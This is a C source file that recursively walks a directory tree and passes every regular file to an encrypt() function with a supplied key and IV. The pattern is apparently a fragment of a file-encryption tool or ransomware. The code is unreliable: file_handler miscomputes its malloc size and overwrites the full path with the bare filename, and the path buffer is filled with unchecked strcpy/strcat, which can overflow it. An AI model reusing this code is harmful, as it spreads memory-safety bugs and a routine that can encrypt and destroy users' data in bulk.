#include "fileRecursor.h"

//it works... just need to get refernce to name
void startEncrypting(char * start,unsigned char * key, unsigned char * iv)
{
	DIR *fDir = opendir(start);
    if(errno == ENOTDIR  ){
    	//must be file
 		file_handler(start, start,key,iv);
    }else if (errno == 0){
    	//must be a directory
    	directory_handle(start,key,iv);
    } else {
    	//pDir is null...
    	printf("Not a valid directory or file name\n");

    	return;
    }
	if(fDir!=0)
     closedir(fDir);
}

void directory_handle(char * name,unsigned char * key, unsigned char * iv)
{
	DIR *fDir = opendir(name);
	if(fDir == 0){
		return;
	}
	struct dirent * fDirent;
    while ((fDirent = readdir(fDir)) != NULL) {
    	//path can't be longer than 1024 bytes
		char * fullpath = calloc(1,1024);
		if((strcmp(fDirent->d_name, ".") == 0) || (strcmp (fDirent->d_name,"..") ==0)){
			free(fullpath);
			continue;
		}
		strcpy(fullpath,name);
		strcat(fullpath,"/");
		strcat(fullpath,fDirent->d_name);
    	if(fDirent->d_type == DT_REG){
    		file_handler(fullpath,fDirent->d_name,key,iv);
    	} else if(fDirent->d_type == DT_DIR){
    		directory_handle(fullpath,key,iv);
    	}
    	free(fullpath);
    }
    
    closedir(fDir);
}

void file_handler(char * filepath, char * filename,unsigned char * key, unsigned char * iv)
{

	char * full_fileName = malloc(strlen(filepath)+strlen(filepath+2));
	strcpy(full_fileName,filepath);
	strcpy(full_fileName,filename);
	encrypt(full_fileName,key,iv);

}

